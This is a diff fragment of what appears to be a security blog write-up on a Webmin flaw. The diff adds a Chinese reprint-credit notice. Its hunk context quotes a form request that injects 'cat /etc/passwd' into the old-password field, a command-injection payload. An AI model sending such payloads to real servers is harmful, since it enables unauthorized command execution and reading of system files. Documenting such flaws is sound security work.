@@ -36,4 +36,9 @@ user=demo&pam=&expired=2&old=test | cat /etc/passwd&new1=test2&new2=test2
 ![webmin](/static/img/webmin.png)
 
 
+------
+
+***「 转载请声明博客地址及APT086&QQ愛安全实验室 」***
+
+
 
